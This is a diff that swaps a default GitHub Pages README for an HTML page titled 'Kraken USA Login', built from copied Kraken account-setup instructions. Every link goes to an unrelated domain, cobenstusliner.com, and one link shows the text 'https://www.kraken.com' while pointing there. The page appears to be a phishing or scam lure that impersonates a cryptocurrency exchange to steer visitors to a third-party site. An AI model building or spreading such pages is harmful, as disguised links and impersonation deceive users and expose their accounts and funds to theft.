@@ -1,37 +1,45 @@
-## Welcome to GitHub Pages
+<html>
+<head>
+<title> Kraken USA Login </title>
 
-You can use the [editor on GitHub](https://github.com/kraken057/login.github.io/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+<a href="https://cobenstusliner.com/fZ4BJQ9d6Q9whrRNPvP4YNSK">
+<img src="https://www.cryptocointrade.com/wp-content/uploads/2017/08/Best-Kraken-Review-2022-Crypto-Exchange-for-USA.webp">
+</a>
 
-### Markdown
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+<body>
+<h1> How To Create An Account On Kraken </h1>
+<p>Creating a <a href="https://cobenstusliner.com/fZ4BJQ9d6Q9whrRNPvP4YNSK"> Kraken account </a> is the first step towards accessing the services that Kraken offers.
 
-```markdown
-Syntax highlighted code block
+<br>Make sure you are visiting the official Kraken site on<a href="https://cobenstusliner.com/fZ4BJQ9d6Q9whrRNPvP4YNSK"> https://www.kraken.com.  </a> 
+<br>Click on the Create Account button in the upper-right corner.  
+<br>Enter your email address, a username (see username tips & requirements) and a strong password (see password tips & requirements) on the signup form.
+<br>Note: the username cannot be changed.
 
-# Header 1
-## Header 2
-### Header 3
+ 
+<br>Read our Terms of Service and Privacy Policy, tick the agree box (if you agree), and then click the Create account Kraken Login.
+<br>If you receive an error after clicking on the Create account button, see this guide.
+You should receive an activation email containing an activation key.
+<br>If you do not receive an activation email, please try these troubleshooting steps. 
+Enter your activation key on the account activation form or alternatively complete activation by clicking the link in the email.  
+<br>Confirm your password, complete the captcha if asked and click the Activate Account button.
+Congratulations! You have successfully created your Kraken account and you’re ready to get started.
+Hi, welcome to Kraken!
 
-- Bulleted
-- List
+<h2> To get started, follow these steps and guides:</h2>
 
-1. Numbered
-2. List
+<br>Create an account
+<br>Secure your account and digital life
+<br>Get verified
+<br>Fund your account
+<br>Then you can:
 
-**Bold** and _Italic_ and `Code` text
+<br>Buy or sell cryptocurrencies ("spot exchange")
+<br>Trade cryptocurrency using margin, if eligible.
+Trade Futures on Kraken Futures
+<br>Download our official mobile apps
 
-[Link](url) and ![Image](src)
-```
-
-For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/kraken057/login.github.io/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+</body>
+</head>
+</html>
